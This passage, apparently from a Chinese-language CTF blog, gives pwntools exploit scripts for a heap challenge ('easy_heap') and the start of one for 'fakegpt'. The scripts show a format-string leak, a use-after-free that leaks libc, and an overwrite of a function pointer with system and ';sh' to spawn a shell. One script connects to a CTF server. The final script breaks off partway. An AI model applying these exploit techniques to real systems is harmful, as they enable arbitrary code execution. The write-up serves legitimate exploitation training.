class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;size :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;del_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;print_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;please input the library name:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;%x.%x.aaa%19$d.%x.%x.%x&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;aaa&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;flag = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(io.recv(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;)) -&lt;span class=&#34;number&#34;&gt;0x208&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#flag = u32(io.recv(5)[1:])&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#flag = int(io.recv(10)) -0x5188+0xe06&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#flag = u32(io.recv(4))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(flag)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(flag))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;45&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_note(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# del_note(4)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,p32(flag))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.recv()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;但是为什么我的system-“-x2F-bin-x2F-sh”-没成功呢&#34;&gt;&lt;a href=&#34;#但是为什么我的system-“-x2F-bin-x2F-sh”-没成功呢&#34; class=&#34;headerlink&#34; title=&#34;但是为什么我的system(“&amp;#x2F;bin&amp;#x2F;sh”)没成功呢?&#34;&gt;&lt;/a&gt;但是为什么我的system(“&amp;#x2F;bin&amp;#x2F;sh”)没成功呢?&lt;/h2&gt;&lt;p&gt;​		先确认下libc版本吧… ubuntu16.04, 首先是libc版本问题,然后本地没成功的话,应该是因为栈平衡?&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;i386&amp;#x27;&lt;/span&gt;,os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;myelf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./easy_heap&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#mylibc = ELF(&amp;#x27;./libc-2.23.so&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./libc_32.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;chall.pwnable.tw&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10102&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io=process(&amp;quot;./easy_heap&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;size :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;del_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;print_note&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;3&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;Index :&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.recvuntil(&amp;quot;please input the library name:&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#io.sendline(&amp;quot;test&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;12&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;45&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_note(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#libc_addr = u32(io.recv(8)[4:8]) - 0x1b27b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_addr = u32(io.recv(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;]) - &lt;span class=&#34;number&#34;&gt;0x1b07b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libc_addr))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sys_addr = libc_addr + mylibc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# add_note(8,&amp;quot;12&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# add_note(8,&amp;quot;34&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# del_note(3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# del_note(4)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;del_note(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add_note(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,p32(sys_addr)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;;sh\x00&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print_note(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-27-5%E6%9C%88%E4%B9%99%E9%98%9F%E6%9C%88%E8%B5%9B%E4%B8%89%E9%A2%98/image-20230523162442076.png&#34; alt=&#34;image-20230523162442076&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-fakegpt&#34;&gt;&lt;a href=&#34;#3-fakegpt&#34; class=&#34;headerlink&#34; title=&#34;3.fakegpt&#34;&gt;&lt;/a&gt;3.fakegpt&lt;/h1&gt;&lt;h2 id=&#34;题目分析-1&#34;&gt;&lt;a href=&#34;#题目分析-1&#34; class=&#34;headerlink&#34; title=&#34;题目分析&#34;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;​		存在格式化字符串漏洞,对输入的字符串做了反向处理和过滤(不过没用到),直接泄露canary和libc地址,找出onegadget,栈溢出覆盖即可&lt;/p&gt;
&lt;h2 id=&#34;exp-2&#34;&gt;&lt;a href=&#34;#exp-2&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mylibc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./fakegpt&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(io)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 验证码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;catpcha_line = io.recvline_contains(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Input the captcha&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;captcha = catpcha_line.split(&lt;span class=&#34;string&#34;&gt;b&amp;#x27; &amp;#x27;&lt;/span&gt;)[-&lt;span 